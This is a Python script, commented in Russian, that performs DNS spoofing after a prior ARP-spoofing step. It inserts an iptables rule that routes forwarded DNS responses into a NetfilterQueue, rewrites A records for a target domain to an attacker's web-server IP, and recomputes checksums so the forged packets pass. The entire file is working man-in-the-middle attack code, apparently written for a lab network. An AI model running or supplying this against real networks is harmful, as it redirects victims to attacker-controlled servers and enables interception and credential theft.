"""
DNS-спуфинг через NetfilterQueue
ARP-спуфинг должен быть уже выполнен
"""
import sys
import signal
import subprocess
from netfilterqueue import NetfilterQueue
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP


TARGET_DOMAIN = "example.com" # домен, который подменяем
FAKE_IP = "172.28.0.20" # IP нашего web-server
QUEUE_NUM = 0 # номер NFQUEUE


def process_packet(packet):
    """ - callback для каждого пакета в NFQUEUE"""
    try:
       # конвертируем пакет в scapy
        scapy_packet = IP(packet.get_payload()) 

        # фильтрация только DNS
        if not scapy_packet.haslayer(DNS):
            packet.accept() # пропускаем без изменений
            return

        dns = scapy_packet[DNS]

        # только ответы
        if dns.qr != 1: # qr=1 — это ответ, qr=0 — запрос
            packet.accept()
            return

        # проверяем, что в ответе есть запись для нашего домена
        if dns.qd is None:
            packet.accept()
            return

        # проверка домена
        qname = dns.qd.qname.decode().rstrip(".")
        if TARGET_DOMAIN not in qname:
            packet.accept()
            return

        print(f"перехвачен DNS-ответ для {qname}: {dns.an.rdata if dns.an else '-'}")

        # подменяем IP в ответе
        if dns.an and dns.an.type == 1:  # IPv4-адрес
            dns.an.rdata = FAKE_IP
            print(f"теперь ip-адрес: {FAKE_IP}")

            # пересчитываем контрольные суммы, тк размер пакета мог измениться
            del scapy_packet[IP].len # общая длина IP-пакета
            del scapy_packet[IP].chksum # контрольная сумма IP-заголовка
            del scapy_packet[UDP].len # длина UDP-датаграммы
            del scapy_packet[UDP].chksum # контрольная сумма UDP

            # отправляем измененный пакет
            packet.set_payload(bytes(scapy_packet))

        packet.accept()

    except Exception as e:
        print(f"возникла ошибка при обработке пакета: {e}")
        packet.accept()


def run_cmd(cmd: list[str]):
    """
    запускает команду без shell, с проверкой кода возврата

    cmd - список аргументов 
    """

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
    except FileNotFoundError:
        print(f"команда не найдена: {cmd[0]}")
        return False

    if result.returncode != 0:
        print(f"{cmd[0]} завершилась с кодом {result.returncode}")
        if result.stderr.strip():
            print(f"stderr: {result.stderr}")
        return False
    
    return True


def setup_iptables() -> bool:
    """настраивает iptables для перехвата DNS в NFQUEUE"""
    # включаем IP-форвардинг
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            if f.read().strip() != "1":
                print("ip_forward не равен 1 !!!!!!!!!!")
                return False
    except Exception:
        pass

    # перехватываем пакеты от DNS-сервера к жертве
    if not run_cmd([
        "iptables", "-I", "FORWARD",
        "-p", "udp", "--sport", "53",
        "-j", "NFQUEUE", "--queue-num", str(QUEUE_NUM),
    ]):
        print("не удалось добавить правило iptables")
        return False

    return True


def clean_iptables():
    """
    удаляет ранее добавленные правила
    вызывается в finally для нормального завершения
    """
    run_cmd([
        "iptables", "-D", "FORWARD",
        "-p", "udp", "--sport", "53",
        "-j", "NFQUEUE", "--queue-num", str(QUEUE_NUM),
    ])


def handle_signal(sig, frame):
    raise KeyboardInterrupt


if __name__ == "__main__":
    if not setup_iptables():
        sys.exit(1)

    signal.signal(signal.SIGTERM, handle_signal)

    print(f"домен: {TARGET_DOMAIN}\nнаш IP: {FAKE_IP}")

    try:
        queue = NetfilterQueue() # создаем очередь
        queue.bind(QUEUE_NUM, process_packet) # привязываем очередь к callback
        queue.run() # забираем пакеты и вызываем callback
    except KeyboardInterrupt:
        print("остановка")
    finally:
        clean_iptables()